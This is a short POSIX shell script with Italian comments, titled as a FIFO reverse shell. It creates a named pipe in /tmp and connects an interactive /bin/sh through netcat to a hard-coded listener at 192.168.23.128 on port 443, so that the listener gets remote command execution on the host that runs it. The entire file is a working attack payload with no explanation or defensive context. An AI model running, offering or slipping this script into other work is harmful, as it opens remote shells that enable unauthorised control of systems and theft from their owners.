#!/bin/sh
# --------------------
# REVERSE SHELL (FIFO)
# --------------------

# Configurazione
LHOST="192.168.23.128"
LPORT="443"
PIPE="/tmp/f"

# Pulizia e Setup
rm -f "$PIPE"
mkfifo "$PIPE" || exit 1

# Esecuzione
cat "$PIPE" | /bin/sh -i 2>&1 | nc "$LHOST" "$LPORT" > "$PIPE"

# Cleanup finale
rm -f "$PIPE"